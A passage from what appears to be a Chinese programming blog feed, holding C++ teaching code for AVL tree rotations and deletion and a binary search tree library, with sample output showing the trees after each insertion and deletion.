class="comment">//需作RR调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;rchild = p1-&gt;lchild;</span><br><span class="line">            p1-&gt;lchild = p;</span><br><span class="line">            p-&gt;bf = p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            p = p1;</span><br><span class="line">            taller = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                    <span class="comment">//需作RL调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 = p1-&gt;lchild;</span><br><span class="line">            p1-&gt;lchild = p2-&gt;rchild;</span><br><span class="line">            p2-&gt;rchild = p1;</span><br><span class="line">            p-&gt;rchild = p2-&gt;lchild;</span><br><span class="line">            p2-&gt;lchild = p;</span><br><span class="line">            <span class="keyword">if</span> (p2-&gt;bf == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">                p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p2-&gt;bf == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;bf = <span class="number">1</span>;</span><br><span class="line">                p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">                p1-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p2-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            p = p2;</span><br><span class="line">            taller = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RightProcess1</span><span class="params">(BSTNode*&amp; p, <span class="type">int</span>&amp; taller)</span> <span class="comment">//在删除结点时进行右处理</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* p1, * p2;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;bf == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">        taller = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;bf == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;bf = <span class="number">1</span>;</span><br><span class="line">        taller = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>        <span class="comment">//p-&gt;bf=1</span></span><br><span class="line">    &#123;</span><br><span class="line">        p1 = p-&gt;lchild;</span><br><span class="line">        <span class="keyword">if</span> (p1-&gt;bf == <span class="number">0</span>)          <span class="comment">//需作LL调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;lchild = p1-&gt;rchild;</span><br><span class="line">            p1-&gt;rchild = p;</span><br><span class="line">            p1-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">            p-&gt;bf = <span class="number">1</span>;</span><br><span class="line">            p = p1;</span><br><span class="line">            taller = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p1-&gt;bf == <span class="number">1</span>)     <span class="comment">//需作LL调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;lchild = p1-&gt;rchild;</span><br><span class="line">            p1-&gt;rchild = p;</span><br><span class="line">            p-&gt;bf = p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            p = p1;</span><br><span class="line">            taller = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                    <span class="comment">//需作LR调整</span></span><br><span class="line">        &#123;</span><br><span class="line">            p2 = p1-&gt;rchild;</span><br><span class="line">            p1-&gt;rchild = p2-&gt;lchild;</span><br><span class="line">            p2-&gt;lchild = p1;</span><br><span class="line">            p-&gt;lchild = p2-&gt;rchild;</span><br><span class="line">            p2-&gt;rchild = p;</span><br><span class="line">            <span class="keyword">if</span> (p2-&gt;bf == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">                p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p2-&gt;bf == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;bf = <span class="number">-1</span>;</span><br><span class="line">                p1-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                p-&gt;bf = <span class="number">0</span>;</span><br><span class="line">                p1-&gt;bf = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p2-&gt;bf = <span class="number">0</span>;</span><br><span class="line">            p = p2;</span><br><span class="line">            taller = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Delete2</span><span class="params">(BSTNode* q, BSTNode*&amp; r, <span class="type">int</span>&amp; taller)</span></span></span><br><span class="line"><span class="function"><span class="comment">//由DeleteAVL()调用,用于处理被删结点左右子树均不空的情况</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q-&gt;key = r-&gt;key;</span><br><span class="line">        q = r;</span><br><span class="line">        r = r-&gt;lchild;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        taller = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Delete2</span>(q, r-&gt;rchild, taller);</span><br><span class="line">        <span class="keyword">if</span> (taller == <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">RightProcess1</span>(r, taller);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DeleteAVL</span><span class="params">(BSTNode*&amp; p, KeyType x, <span class="type">int</span>&amp; taller)</span> <span class="comment">//在AVL树p中删除关键字为x的结点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    BSTNode* q;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; p-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        k = <span class="built_in">DeleteAVL</span>(p-&gt;lchild, x, taller);</span><br><span class="line">        <span class="keyword">if</span> (taller == <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">LeftProcess1</span>(p, taller);</span><br><span class="line">        <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; p-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        k = <span class="built_in">DeleteAVL</span>(p-&gt;rchild, x, taller);</span><br><span class="line">        <span class="keyword">if</span> (taller == <span class="number">1</span>)</span><br><span class="line">            <span class="built_in">RightProcess1</span>(p, taller);</span><br><span class="line">        <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>            <span class="comment">//找到了关键字为x的结点,由p指向它</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = p;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;rchild == <span class="literal">NULL</span>)        <span class="comment">//被删结点右子树为空</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;lchild;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            taller = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;lchild == <span class="literal">NULL</span>)   <span class="comment">//被删结点左子树为空</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;rchild;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            taller = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">//被删结点左右子树均不空</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Delete2</span>(q, q-&gt;lchild, taller);</span><br><span class="line">            <span class="keyword">if</span> (taller == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">LeftProcess1</span>(q, taller);</span><br><span class="line">            p = q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* b = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    KeyType a[] = &#123; <span class="number">16</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">14</span>,<span class="number">15</span> &#125;, n = <span class="number">9</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; 创建一棵AVL树:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   第%d步,插入%d元素:&quot;</span>, i + <span class="number">1</span>, a[i]);</span><br><span class="line">        <span class="built_in">InsertAVL</span>(b, a[i], j);</span><br><span class="line">        <span class="built_in">DispBSTree</span>(b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   AVL:&quot;</span>);</span><br><span class="line">    <span class="built_in">DispBSTree</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; 删除结点:\n&quot;</span>);</span><br><span class="line">    k = <span class="number">11</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   删除结点%d:&quot;</span>, k);</span><br><span class="line">    <span class="built_in">DeleteAVL</span>(b, k, j);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   AVL:&quot;</span>);</span><br><span class="line">    <span class="built_in">DispBSTree</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    k = <span class="number">9</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   删除结点%d:&quot;</span>, k);</span><br><span class="line">    <span class="built_in">DeleteAVL</span>(b, k, j);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   AVL:&quot;</span>);</span><br><span class="line">    <span class="built_in">DispBSTree</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    k = <span class="number">15</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   删除结点%d:&quot;</span>, k);</span><br><span class="line">    <span class="built_in">DeleteAVL</span>(b, k, j);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   AVL:&quot;</span>);</span><br><span class="line">    <span class="built_in">DispBSTree</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="示意图："><a href="#示意图：" class="headerlink" title="示意图："></a>示意图：</h2><p>创建一棵AVL树<br>    第1步，插入16元素16<br>    第2步，插入3元素16（3）<br>    第3步，插入7元素7（3，16）<br>    第4步，插入11元素7（3，16（11））<br>    第5步，插入9元素7（3，11（9，16））<br>    第6步，插入26元素11（7（3，9），16（，26））<br>    第7步，插入18元素11（7（3，9），18（16，26））<br>    第8步，插入14元素11（7（3，9），18（16（14），26））<br>    第9步，插入15元素11（7（3，9），18（15（14，16），26））<br>    AVL11（7（3，9），18（15（14，16），26））</p>
<p>删除结点<br>    删除结点11：AVL9（7（3），18（1504，16），26））<br>    删除结点9：AVL15（7（3，14），18（16，26））<br>    删除结点15：AVL.14（7（3），18（16，26））</p>
<h1 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h1><h2 id="算法库"><a href="#算法库" class="headerlink" title="算法库"></a>算法库</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;     <span class="comment">//定义关键字类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>                 <span class="comment">//记录类型</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType key;                    <span class="comment">//关键字项</span></span><br><span class="line">    InfoType data;                 <span class="comment">//其他数据域</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>* lchild, * rchild;  <span class="comment">//左右孩子指针</span></span><br><span class="line">&#125;BSTNode;</span><br><span class="line"><span class="type">int</span> path[MaxSize];      <span class="comment">//全局变量,用于存放路径</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispBST</span><span class="params">(BSTNode* b)</span></span>;    <span class="comment">//函数说明</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertBST</span><span class="params">(BSTNode*&amp; p, KeyType k)</span> <span class="comment">//在以*p为根节点的BST中插入一个关键字为k的节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)      <span class="comment">//原树为空, 新插入的记录为根节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = (BSTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BSTNode));</span><br><span class="line">        p-&gt;key = k; p-&gt;lchild = p-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (k == p-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (k &lt; p-&gt;key)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">InsertBST</span>(p-&gt;lchild, k); <span class="comment">//插入到*p的左子树中</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">InsertBST</span>(p-&gt;rchild, k);  <span class="comment">//插入到*p的右子树中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BSTNode* <span class="title">CreatBST</span><span class="params">(KeyType A[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"><span class="comment">//由数组A中的关键字建立一棵二叉排序树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* bt = <span class="literal">NULL</span>;            <span class="comment">//初始时bt为空树</span></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">InsertBST</span>(bt, A[i]) == <span class="number">1</span>)  <span class="comment">//将A[i]插入二叉排序树T中</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    第%d步,插入%d:&quot;</span>, i + <span class="number">1</span>, A[i]);</span><br><span class="line">            <span class="built_in">DispBST</span>(bt); <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;                  <span class="comment">//返回建立的二叉排序树的根指针</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Delete1</span><span class="params">(BSTNode* p, BSTNode*&amp; r)</span></span></span><br><span class="line"><span class="function"><span class="comment">//当被删*p节点有左右子树时的删除过程</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* q;</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">Delete1</span>(p, r-&gt;rchild); <span class="comment">//递归找最右下节点</span></span><br><span class="line">    <span class="keyword">else</span>      <span class="comment">//找到了最右下节点*r</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;key = r-&gt;key;   <span class="comment">//将*r的关键字值赋给*p</span></span><br><span class="line">        q = r;</span><br><span class="line">        r = r-&gt;lchild;   <span class="comment">//将*r的双亲节点的右孩子节点改为*r的左孩子节点</span></span><br><span class="line">        <span class="built_in">free</span>(q);    <span class="comment">//释放原*r的空间</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Delete</span><span class="params">(BSTNode*&amp; p)</span></span></span><br><span class="line"><span class="function"><span class="comment">//从二叉排序树中删除*p节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* q;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;rchild == <span class="literal">NULL</span>)  <span class="comment">//*p节点没有右子树的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = p; p = p-&gt;lchild; <span class="built_in">free</span>(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;lchild == <span class="literal">NULL</span>) <span class="comment">//*p节点没有左子树的情况</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = p; p = p-&gt;rchild; <span class="built_in">free</span>(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">Delete1</span>(p, p-&gt;lchild); <span class="comment">//*p节点既有左子树又有右子树的情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">DeleteBST</span><span class="params">(BSTNode*&amp; bt, KeyType k)</span></span></span><br><span class="line"><span class="function"><span class="comment">//在bt中删除关键字为k的节点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bt == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//空树删除失败</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; bt-&gt;key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">DeleteBST</span>(bt-&gt;lchild, k);  <span class="comment">//递归在左子树中删除关键字为k的节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (k &gt; bt-&gt;key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">DeleteBST</span>(bt-&gt;rchild, k);  <span class="comment">//递归在右子树中删除关键字为k的节点</span></span><br><span class="line">        <span class="keyword">else</span>         <span class="comment">//k=bt-&gt;key的情况</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Delete</span>(bt);  <span class="comment">//调用Delete(bt)函数删除*bt节点</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SearchBST1</span><span class="params">(BSTNode* bt, KeyType k, KeyType path[], <span class="type">int</span> i)</span></span></span><br><span class="line"><span class="function"><span class="comment">//以非递归方式输出从根节点到查找到的节点的路径</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">if</span> (bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (k == bt-&gt;key) <span class="comment">//找到了节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        path[i + <span class="number">1</span>] = bt-&gt;key; <span class="comment">//输出其路径</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i + <span class="number">1</span>; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, path[j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        path[i + <span class="number">1</span>] = bt-&gt;key;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; bt-&gt;key)</span><br><span class="line">            <span class="built_in">SearchBST1</span>(bt-&gt;lchild, k, path, i + <span class="number">1</span>);  <span class="comment">//在左子树中递归查找</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">SearchBST1</span>(bt-&gt;rchild, k, path, i + <span class="number">1</span>);  <span class="comment">//在右子树中递归查找</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">SearchBST2</span><span class="params">(BSTNode* bt, KeyType k)</span></span></span><br><span class="line"><span class="function"><span class="comment">//以递归方式输出从根节点到查找到的节点的路径</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (k == bt-&gt;key)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, bt-&gt;key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (k &lt; bt-&gt;key)</span><br><span class="line">        <span class="built_in">SearchBST2</span>(bt-&gt;lchild, k);  <span class="comment">//在左子树中递归查找</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">SearchBST2</span>(bt-&gt;rchild, k);  <span class="comment">//在右子树中递归查找</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, bt-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispBST</span><span class="params">(BSTNode* bt)</span></span></span><br><span class="line"><span class="function"><span class="comment">//以括号表示法输出二叉排序树bt</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bt != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, bt-&gt;key);</span><br><span class="line">        <span class="keyword">if</span> (bt-&gt;lchild != <span class="literal">NULL</span> || bt-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            <span class="built_in">DispBST</span>(bt-&gt;lchild);</span><br><span class="line">            <span class="keyword">if</span> (bt-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="built_in">DispBST</span>(bt-&gt;rchild);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">KeyType predt = <span class="number">-32767</span>; <span class="comment">//predt为全局变量,保存当前节点中序前趋的值,初值为-∞</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">JudgeBST</span><span class="params">(BSTNode* bt)</span> <span class="comment">//判断bt是否为BST</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> b1, b2;</span><br><span class="line">    <span class="keyword">if</span> (bt == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        b1 = <span class="built_in">JudgeBST</span>(bt-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span> (b1 == <span class="number">0</span> || predt &gt;= bt-&gt;key)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        predt = bt-&gt;key;</span><br><span class="line">        b2 = <span class="built_in">JudgeBST</span>(bt-&gt;rchild);</span><br><span class="line">        <span class="keyword">return</span> b2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BSTNode* bt;</span><br><span class="line">    KeyType k = <span class="number">6</span>;</span><br><span class="line">    <span class="type">int</span> a[] = &#123; <span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span> &#125;, n = <span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(1)创建一棵BST树:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    bt = <span class="built_in">CreatBST</span>(a, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    括号表示BST:&quot;</span>); <span class="built_in">DispBST</span>(bt); <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(2)判断：bt%s\n&quot;</span>, (<span class="built_in">JudgeBST</span>(bt) ? <span class="string">&quot;是一棵BST&quot;</span> : <span class="string">&quot;不是一棵BST&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(3)a.查找%d关键字(递归,顺序):&quot;</span>, k); <span class="built_in">SearchBST1</span>(bt, k, path, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   b.查找%d关键字(非递归,逆序):&quot;</span>, k); <span class="built_in">SearchBST2</span>(bt, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n(4)删除并输出操作:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   原BST:&quot;</span>); <span class="built_in">DispBST</span>(bt); <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   删除节点4:&quot;</span>);</span><br><span class="line">    <span class="built_in">DeleteBST</span>(bt, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">DispBST</span>(bt); <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;   删除节点5:&quot;</span>);</span><br><span class="line">    <span class="built_in">DeleteBST</span>(bt, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">DispBST</span>(bt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="示意图：-1"><a href="#示意图：-1" class="headerlink" title="示意图："></a>示意图：</h2><p>运行即可</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>排序二叉树</title>
    <url>/2021/05/15/%E6%8E%92%E5%BA%8F%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
